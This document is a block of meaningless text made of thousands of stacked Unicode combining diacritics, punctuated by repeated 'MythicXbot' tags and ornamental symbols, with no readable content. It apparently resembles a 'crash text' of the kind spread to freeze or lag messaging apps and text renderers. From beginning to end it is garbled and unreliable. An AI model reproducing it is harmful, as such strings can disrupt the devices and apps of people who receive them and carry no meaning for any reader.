̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴Myth
icXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicX
bot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔ
ৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘